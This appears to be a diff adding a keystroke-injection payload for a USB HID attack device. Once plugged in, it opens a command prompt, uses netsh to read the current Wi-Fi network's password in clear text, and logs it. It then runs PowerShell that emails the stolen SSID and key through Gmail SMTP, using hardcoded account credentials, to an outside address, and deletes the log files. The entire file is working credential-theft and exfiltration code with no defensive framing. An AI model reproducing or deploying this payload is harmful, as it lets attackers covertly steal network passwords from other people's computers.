@@ -1,0 +1,51 @@
+CustomDelay:3000
+Press:131+100
+CustomDelay:250
+Press:131+114
+CustomDelay:250
+Print:cmd
+Press:176
+Print:cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:"  %a in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set a=%a
+Press:176
+Print:set a="%a:~1%"
+Press:176
+Print:netsh wlan show profiles %a% key=clear | findstr /c:"Network type"  /c:" Authentication"  /c:"Key Content"| findstr /v "broadcast"| findstr /v "Radio">>a
+Press:176
+Print:for /f "tokens=3 delims=: "  %a in ('findstr "Network type"  a') do set b=%a
+Press:176
+Print:for /f "tokens=2 delims=: "  %a in ('findstr " Authentication"  a') do set c=%a
+Press:176
+Print:for /f "tokens=3 delims=: "  %a in ('findstr "Key Content"  a') do set d=%a
+Press:176
+Print:del a
+Press:176
+Print:echo ssid: %a%>>log & echo type: %b%>>log & echo auth: %c%>>log & echo key: %d%>>log
+Press:176
+Print:powershell
+Press:176
+Print:$SMTPServer = 'smtp.gmail.com'
+Press:176
+Print:$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+Press:176
+Print:$SMTPInfo.EnableSsl = $true
+Press:176
+Print:$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('billgatesducky@gmail.com', 'Micr0$0ft')
+Press:176
+Print:$ReportEmail = New-Object System.Net.Mail.MailMessage
+Press:176
+Print:$ReportEmail.From = 'quackquack@gmail.com'
+Press:176
+Print:$ReportEmail.To.Add('billgatesducky@gmail.com')
+Press:176
+Print:$ReportEmail.Subject = 'Your Wifi Login'
+Press:176
+Print:$ReportEmail.Body = (Get-Content log | out-string)
+Press:176
+Print:$SMTPInfo.Send($ReportEmail)
+Press:176
+CustomDelay:1000
+Print:exit
+Press:176
+CustomDelay:500
+Print:del log & exit
+Press:176
